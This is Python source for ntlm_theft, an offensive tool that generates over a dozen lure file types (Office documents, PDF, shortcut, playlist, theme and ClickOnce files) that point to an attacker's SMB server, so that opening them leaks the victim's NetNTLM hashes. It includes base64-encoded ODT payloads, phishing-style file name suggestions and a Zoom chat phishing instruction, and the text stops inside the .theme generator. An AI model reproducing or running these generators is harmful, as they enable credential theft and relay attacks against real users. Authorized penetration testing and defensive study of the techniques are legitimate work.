#!/usr/bin/env 
# -*- coding: utf-8 -*-
from __future__ import print_function

# Tested on Windows 10 1903 Build 18362.720
# Working Attacks:
# Browse to directory: .url
# Open file: .xml, .rtf, .jnlp, .xml (includePicture), .asx, .docx (includePicture), .docx (remoteTemplate), .docx (via Frameset), .xlsx (via External Cell), .htm (Open locally with Chrome, IE or Edge)
# Open file and allow: pdf
# Browser download and open: .application (Must be downloaded via a web browser and run)
# Partial Open file: .m3u (Works if you open with windows media player, but windows 10 auto opens with groove music)

# In progress - desktop.ini (Need to test older windows versions), autorun.ini (Need to test before windows 7), scf (Need to test on older windows)


# References
# https://ired.team/offensive-security/initial-access/t1187-forced-authentication
# https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html
# https://ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
# https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/
# https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
# https://github.com/rocketscientist911/excel-ntlmv2
# https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/#comments
# https://www.youtube.com/watch?v=PDpBEY1roRc
# https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt

import argparse
import io
import os
import shutil
import sys
import tempfile
import xlsxwriter
import base64
import zipfile
from sys import exit


#the basic path of the script, make it possible to run from anywhere
script_directory = os.path.dirname(os.path.abspath(__file__))

GENERATOR_DESCRIPTIONS = {
    "all": "Generate all supported file types",
    "modern": "Generate only attacks expected to work on modern Windows",
    "odt": "Generate a malicious .odt for LibreOffice/OpenOffice",
    "scf": "Generate .scf (legacy Windows browse-to-folder technique)",
    "url": "Generate .url files (URL + ICONFILE browse-to-folder techniques)",
    "lnk": "Generate a .lnk that references a remote icon over SMB",
    "rtf": "Generate .rtf with INCLUDEPICTURE referencing a remote SMB resource",
    "xml": "Generate Word .xml variants (external stylesheet + includepicture)",
    "htm": "Generate .htm that triggers remote resource load when opened locally",
    "docx": "Generate .docx variants (includepicture, remote template, frameset)",
    "xlsx": "Generate .xlsx with an external cell reference",
    "wax": "Generate .wax playlist referencing remote resources",
    "m3u": "Generate .m3u playlist referencing remote resources",
    "asx": "Generate .asx playlist referencing remote resources",
    "jnlp": "Generate .jnlp referencing a remote JAR",
    "application": "Generate a .application ClickOnce manifest referencing remote dependency",
    "pdf": "Generate a .pdf that triggers a remote UNC path when opened and allowed",
    "zoom": "Generate Zoom chat instructions (legacy behavior)",
    "libraryms": "Generate a .library-ms referencing a remote icon",
    "autoruninf": "Generate Autorun.inf (legacy behavior)",
    "desktopini": "Generate desktop.ini (legacy behavior)",
    "theme": "Generate a Windows .theme file referencing remote resources",
}

#arg parser to generate all or one file

#python ntlm_theft --generate all --ip 127.0.0.1 --filename board-meeting2020
parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description='ntlm_theft by Jacob Wilkin(Greenwolf)',
        usage='%(prog)s --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>')
parser.add_argument('-v', '--version', action='version',
    version='%(prog)s 0.1.0 : ntlm_theft by Jacob Wilkin(Greenwolf)')
parser.add_argument('-vv', '--verbose', action='store_true', dest='vv', help='Verbose Mode')

parser.add_argument(
    '-g',
    '--generate',
    action='store',
    dest='generate',
    required=False,
    choices=sorted(GENERATOR_DESCRIPTIONS.keys()),
    help='Choose to generate all files or a specific filetype'
)
parser.add_argument(
    '-s',
    '--server',
    action='store',
    dest='server',
    required=False,
    help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)'
)
parser.add_argument(
    '-f',
    '--filename',
    action='store',
    dest='filename',
    required=False,
    help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)'
)

parser.add_argument(
    '--output-dir',
    default='.',
    help='Parent directory to write output folder into (default: current directory)'
)
parser.add_argument(
    '--force',
    action='store_true',
    help='Delete existing output folder without prompting'
)
parser.add_argument(
    '--zip-output',
    action='store_true',
    help='Also zip the generated output folder (<folder>.zip)'
)
parser.add_argument(
    '--list',
    action='store_true',
    help='List available generators and exit'
)
parser.add_argument(
    '--describe',
    metavar='TYPE',
    choices=sorted(GENERATOR_DESCRIPTIONS.keys()),
    help='Describe a generator and exit'
)
parser.add_argument(
    '--color',
    choices=('auto', 'always', 'never'),
    default='auto',
    help='Colored output: auto (default), always, never'
)

ANSI_RESET = "\033[0m"
ANSI_BOLD = "\033[1m"
ANSI_GREEN = "\033[32m"
ANSI_YELLOW = "\033[33m"
ANSI_RED = "\033[31m"
ANSI_CYAN = "\033[36m"

_COLOR_MODE = "auto"
_COLOR_ENABLED = False


def _compute_color_enabled(color_mode: str) -> bool:
    if color_mode == "always":
        return True
    if color_mode == "never":
        return False

    if os.environ.get("NO_COLOR") is not None:
        return False
    if not sys.stdout.isatty():
        return False
    if os.environ.get("TERM") in (None, "dumb"):
        return False
    return True


def _color(text: str, ansi: str) -> str:
    if not _COLOR_ENABLED:
        return text
    return f"{ansi}{text}{ANSI_RESET}"


def log_info(message: str) -> None:
    print(_color(message, ANSI_CYAN))


def log_skip(message: str) -> None:
    print(_color(message, ANSI_YELLOW))


def log_error(message: str) -> None:
    print(_color(message, ANSI_RED + ANSI_BOLD))


def log_created(path: str, mode: str) -> None:
    print(_color(f"Created: {path} ({mode})", ANSI_GREEN))


def validate_basename(name: str) -> None:
    if not name or name.strip() == "":
        raise ValueError("Filename cannot be empty")
    if name in (".", ".."):
        raise ValueError("Filename must not be '.' or '..'")
    if os.path.sep in name or (os.path.altsep and os.path.altsep in name):
        raise ValueError("Filename must be a base name (no path separators)")


def zip_directory(source_dir: str, zip_path: str) -> None:
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(source_dir):
            for file_name in files:
                full_path = os.path.join(root, file_name)
                arcname = os.path.relpath(full_path, start=source_dir)
                zf.write(full_path, arcname=arcname)


# .odt

def create_odt_ntlm_leak(server_ip: str, output_filename: str):

    # === BASE64 ENCODED PARTS ===
    contentxml1 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczpvZmZpY2Vvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L29mZmljZSIgeG1sbnM6dGFibGVvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L3RhYmxlIiB4bWxuczpkcmF3b29vPSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAxMC9kcmF3IiB4bWxuczpjYWxjZXh0PSJ1cm46b3JnOmRvY3VtZW50Zm91bmRhdGlvbjpuYW1lczpleHBlcmltZW50YWw6Y2FsYzp4bWxuczpjYWxjZXh0OjEuMCIgeG1sbnM6bG9leHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpvZmZpY2U6eG1sbnM6bG9leHQ6MS4wIiB4bWxuczpmaWVsZD0idXJuOm9wZW5vZmZpY2U6bmFtZXM6ZXhwZXJpbWVudGFsOm9vby1tcy1pbnRlcm9wOnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVub2ZmaWNlOm5hbWVzOmV4cGVyaW1lbnRhbDpvb3htbC1vZGYtaW50ZXJvcDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6Y3NzM3Q9Imh0dHA6Ly93d3cudzMub3JnL1RSL2NzczMtdGV4dC8iIG9mZmljZTp2ZXJzaW9uPSIxLjIiPjxvZmZpY2U6c2NyaXB0cy8+PG9mZmljZTpmb250LWZhY2UtZGVjbHM+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FuczEiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7THVjaWRhIFNhbnMmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InN3aXNzIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNlcmlmIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2VyaWYmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InJvbWFuIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTGliZXJhdGlvbiBTYW5zIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3dpc3MiIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FucyIgc3ZnOmZvbnQtZmFtaWx5PSImYXBvcztMdWNpZGEgU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTWljcm9zb2Z0IFlhSGVpIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO01pY3Jvc29mdCBZYUhlaSZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iU2ltU3VuIiBzdmc6Zm9udC1mYW1pbHk9IlNpbVN1biIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjwvb2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48b2ZmaWNlOmF1dG9tYXRpYy1zdHlsZXM+PHN0eWxlOnN0eWxlIHN0eWxlOm5hbWU9ImZyMSIgc3R5bGU6ZmFtaWx5PSJncmFwaGljIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iT0xFIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOmhvcml6b250YWwtcG9zPSJjZW50ZXIiIHN0eWxlOmhvcml6b250YWwtcmVsPSJwYXJhZ3JhcGgiIGRyYXc6b2xlLWRyYXctYXNwZWN0PSIxIi8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCIvPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iT2JqZWN0MSIgdGV4dDphbmNob3ItdHlwZT0icGFyYWdyYXBoIiBzdmc6d2lkdGg9IjE0LjEwMWNtIiBzdmc6aGVpZ2h0PSI5Ljk5OWNtIiBkcmF3OnotaW5kZXg9IjAiPjxkcmF3Om9iamVjdCB4bGluazpocmVmPSJmaWxlOi8v"
    contentxml3 = "L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg=="

    # === DECODE PARTS AND INJECT IP ===
    part1 = base64.b64decode(contentxml1).decode("utf-8")
    part2 = base64.b64decode(contentxml3).decode("utf-8")
    fileout = part1 + server_ip + part2

    # === WRITE content.xml ===
    with open("content.xml", "w", encoding="utf-8") as f:
        f.write(fileout)

    # === CREATE BLANK ODT USING ezodf ===
    try:
        from ezodf import newdoc
    except ImportError:
        raise ImportError("Missing `ezodf`. Install with:\n  pip install ezodf && pip install --upgrade lxml")

    temp_odt = "temp.odt"
    odt = newdoc(doctype='odt', filename=temp_odt)
    odt.save()

    # === REBUILD ODT FILE WITH MALICIOUS content.xml ===
    with zipfile.ZipFile(temp_odt, 'r') as zin, zipfile.ZipFile(output_filename, 'w') as zout:
        for item in zin.infolist():
            if item.filename != 'content.xml':
                zout.writestr(item, zin.read(item.filename))

    with zipfile.ZipFile(output_filename, 'a') as zf:
        zf.write("content.xml", arcname="content.xml")

    # === CLEAN UP ===
    os.remove("content.xml")
    os.remove(temp_odt)

    log_created(output_filename, "Open in LibreOffice / OpenOffice")


# NOT WORKING ON LATEST WINDOWS
# .scf remote IconFile Attack
# Filename: shareattack.scf, action=browse, attacks=explorer
def create_scf(generate,server,filename):
	if generate == "modern":
		log_skip("Skipping SCF as it does not work on modern Windows")
		return
	file = open(filename,'w')
	file.write('''[Shell]
Command=2
IconFile=\\\\''' + server + '''\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop''')
	file.close()
	log_created(filename, "BROWSE TO FOLDER")

# .url remote url attack
def create_url_url(generate,server,filename):
	file = open(filename,'w')
	file.write('''[InternetShortcut]
URL=file://''' + server + '''/leak/leak.html''')
	file.close()
	log_created(filename, "BROWSE TO FOLDER")


# .url remote IconFile attack
# Filename: shareattack.url, action=browse, attacks=explorer
def create_url_icon(generate,server,filename):
	file = open(filename,'w')
	file.write('''[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\''' + server + '''\\%USERNAME%.icon
IconIndex=1''')
	file.close()
	log_created(filename, "BROWSE TO FOLDER")

# .rtf remote INCLUDEPICTURE attack
# Filename: shareattack.rtf, action=open, attacks=notepad/wordpad
def create_rtf(generate,server,filename):
	file = open(filename,'w')
	file.write('''{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://''' + server + '''/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}''')
	file.close()
	log_created(filename, "OPEN")

# .xml remote stylesheet attack
# Filename: shareattack.xml, action=open, attacks=word
def create_xml(generate,server,filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\\\''' + server + '''\\bad.xsl" ?>''')
	file.close()
	log_created(filename, "OPEN")

# .xml with remote includepicture field attack
# Filename: shareattack.xml, action=open, attacks=word
def create_xml_includepicture(generate,server, filename):
	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml") 
	# Read the template file
	file = open(documentfilename, 'r', encoding="utf8")
	filedata = file.read()
	file.close()
	# Replace the target string
	filedata = filedata.replace('127.0.0.1', server)
	# Write the file out again
	file = open(filename, 'w', encoding="utf8")
	file.write(filedata)
	file.close()
	log_created(filename, "OPEN")

# .htm with remote image attack
# Filename: shareattack.htm, action=open, attacks=internet explorer + Edge + Chrome when launched from desktop
def create_htm(generate,server,filename):
	file = open(filename,'w')
	file.write('''<!DOCTYPE html>
<html>
   <img src="file://''' + server + '''/leak/leak.png"/>
</html>''')
	file.close()
	log_created(filename, "OPEN FROM DESKTOP WITH CHROME, IE OR EDGE")

# .htm with rlocal handler attack
# Filename: shareattack-(handler).htm, action=open, attacks=open in web browser, will automatically open word
def create_htm_handler(generate,server,filename):
	file = open(filename,'w')
	file.write('''<!DOCTYPE html>
<html>
	<script>
		location.href = 'ms-word:ofe|u|\\\\' + server + '\\leak\\leak.docx';

	</script>
</html>''')
	file.close()
	log_created(filename, "OPEN FROM DESKTOP WITH CHROME, IE OR EDGE")

# .docx file with remote includepicture field attack
def create_docx_includepicture(generate,server,filename):
	# Source path  
	src = os.path.join(script_directory,"templates", "docx-includepicture-template") 
	# Destination path  
	dest = os.path.join("docx-includepicture-template")
	# Copy the content of  
	# source to destination  
	shutil.copytree(src, dest)  
	documentfilename = os.path.join("docx-includepicture-template", "word", "_rels", "document.xml.rels")
	# Read the template file
	file = open(documentfilename, 'r')
	filedata = file.read()
	file.close()
	# Replace the target string
	filedata = filedata.replace('127.0.0.1', server)
	# Write the file out again
	file = open(documentfilename, 'w')
	file.write(filedata)
	file.close()
	shutil.make_archive(filename, 'zip', "docx-includepicture-template")
	os.rename(filename +".zip",filename)
	shutil.rmtree("docx-includepicture-template")
	log_created(filename, "OPEN")

# .docx file with remote template attack
# Filename: shareattack.docx (unzip and put inside word\_rels\settings.xml.rels), action=open, attacks=word
# Instructions: Word > Create New Document > Choose a Template > Unzip docx, change target in word\_rels\settings.xml.rels change target to smb server
def create_docx_remote_template(generate,server,filename):
	# Source path  
	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template") 
	# Destination path  
	dest = os.path.join("docx-remotetemplate-template")
	# Copy the content of  
	# source to destination  
	shutil.copytree(src, dest)  
	documentfilename = os.path.join("docx-remotetemplate-template", "word", "_rels", "settings.xml.rels")
	# Read the template file
	file = open(documentfilename, 'r')
	filedata = file.read()
	file.close()
	# Replace the target string
	filedata = filedata.replace('127.0.0.1', server)
	# Write the file out again
	file = open(documentfilename, 'w')
	file.write(filedata)
	file.close()
	shutil.make_archive(filename, 'zip', "docx-remotetemplate-template")
	os.rename(filename +".zip",filename)
	shutil.rmtree("docx-remotetemplate-template")
	log_created(filename, "OPEN")

# .docx file with Frameset attack
def create_docx_frameset(generate,server,filename):
	# Source path  
	src = os.path.join(script_directory,"templates", "docx-frameset-template") 
	# Destination path  
	dest = os.path.join("docx-frameset-template")
	# Copy the content of  
	# source to destination  
	shutil.copytree(src, dest)  
	documentfilename = os.path.join("docx-frameset-template", "word", "_rels", "webSettings.xml.rels")
	# Read the template file
	file = open(documentfilename, 'r')
	filedata = file.read()
	file.close()
	# Replace the target string
	filedata = filedata.replace('127.0.0.1', server)
	# Write the file out again
	file = open(documentfilename, 'w')
	file.write(filedata)
	file.close()
	shutil.make_archive(filename, 'zip', "docx-frameset-template")
	os.rename(filename +".zip",filename)
	shutil.rmtree("docx-frameset-template")
	log_created(filename, "OPEN")

# .xlsx file with cell based attack
def create_xlsx_externalcell(generate,server,filename):
	workbook = xlsxwriter.Workbook(filename)
	worksheet = workbook.add_worksheet()
	worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
	workbook.close()
	log_created(filename, "OPEN")

# .wax remote playlist attack
# Filename: shareattack.wax, action=open, attacks=windows media player
def create_wax(generate,server,filename):
	file = open(filename,'w')
	file.write('''https://''' + server + '''/test
file://\\\\''' + server + '''/steal/file''')
	file.close()
	log_created(filename, "OPEN")

# .m3u remote playlist attack
# Filename: shareattack.m3u, action=open, attacks=windows media player
def create_m3u(generate,server,filename):
	file = open(filename,'w')
	file.write('''#EXTM3U
#EXTINF:1337, Leak
\\\\''' + server + '''\\leak.mp3''')
	file.close()
	log_created(filename, "OPEN IN WINDOWS MEDIA PLAYER ONLY")

# .asx remote playlist attack
# Filename: shareattack.asx, action=open, attacks=windows media player
def create_asx(generate,server,filename):
	file = open(filename,'w')
	file.write('''<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://''' + server + '''/leak/leak.wma"/>
   </entry>
</asx>''')
	file.close()
	log_created(filename, "OPEN")

# .jnlp remote jar attack
# Filename: shareattack.jnlp, action=open, attacks=java web start
def create_jnlp(generate,server,filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="" href="">
   <resources>
      <jar href="file://''' + server + '''/leak/leak.jar"/>
   </resources>
   <application-desc/>
</jnlp>''')
	file.close()
	log_created(filename, "OPEN")

# .application remote dependency codebase attack
# Filename: shareattack.application, action=open, attacks= .NET ClickOnce
def create_application(generate,server,filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
   <dependency>
      <dependentAssembly dependencyType="install" codebase="file://''' + server + '''/leak/Leak.exe.manifest" size="32909">
         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
         <hash>
            <dsig:Transforms>
               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
            </dsig:Transforms>
            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
         </hash>
      </dependentAssembly>
   </dependency>
</asmv1:assembly>''')
	file.close()
	log_created(filename, "DOWNLOAD AND OPEN")

# .pdf remote object? attack
# Filename: shareattack.pdf, action=open, attacks=Adobe Reader (Others?)
def create_pdf(generate,server,filename):
	file = open(filename,'w')
	file.write('''%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
	   /O <<
	      /F (\\\\\\\\''' + server + '''\\\\test)
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>
	   >>
	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
	/Root 1 0 R
>>
%%EOF''')
	file.close()
	log_created(filename, "OPEN AND ALLOW")


def create_zoom(generate,server,filename):
	if generate == "modern":
		log_skip("Skipping zoom as it does not work on the latest versions")
		return
	file = open(filename,'w')
	file.write('''To attack zoom, just put the following link along with your phishing message in the chat window:

\\\\''' + server + '''\\xyz
''')
	file.close()
	log_created(filename, "PASTE TO CHAT")

def create_theme(generate,server,filename):
	with open(filename, 'w') as file:
		file.write('''[Theme]
; Windows - IDS_THEME_DISPLAYNAME_AERO_LIGHT
DisplayName=\\'''+ server +''' Theme
SetLogonBackground=0
; Computer - SHIDI_SERVER
[CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon]
DefaultValue=\\\\'''+server+'''\\setup.exe,-109

; UsersFiles - SHIDI_USERFILES
[CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\DefaultIcon]
DefaultValue=\\\\'''+server+'''\\setup.exe,-123

; Network - SHIDI_MYNETWORK
[CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\DefaultIcon]
DefaultValue=\\\\'''+server+'''\\setup.exe,-25

; Recycle Bin - SHIDI_RECYCLERFULL SHIDI_RECYCLER
[CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon]
Full=\\\\'''+server+'''\\setup.exe,-54
Empty=\\\\'''+server+'''\\setup.exe,-55

[Control Panel\\Cursors]
AppStarting=\\\\'''+server+'''\\setup.exe
Arrow=\\\\'''+server+'''\\aero_arrow.cur
Crosshair=
Hand=\\\\'''+server+'''\\aero_link.cur
Help=\\\\'''+server+'''\\aero_helpsel.cur
IBeam=
No=\\\\'''+server+'''\\aero_unavail.cur
NWPen=\\\\'''+server+'''\\aero_pen.cur
